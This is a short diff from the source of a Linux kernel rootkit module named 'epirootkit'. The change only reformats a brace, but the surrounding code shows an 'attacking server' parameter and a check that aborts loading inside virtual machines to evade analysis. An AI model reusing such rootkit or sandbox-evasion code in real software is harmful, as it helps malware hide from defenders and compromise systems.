@@ -24,8 +24,7 @@ MODULE_PARM_DESC(message, "Message to send to the attacking server");
 static int __init epirootkit_init(void) {
     DBG_MSG("epirootkit_init: trying to load module...\n");
 
-    if (VANISH && is_running_in_virtual_env())
-    {
+    if (VANISH && is_running_in_virtual_env()) {
         ERR_MSG("epirootkit_init: nooope, you should not pass\n");
         return -FAILURE;
     }
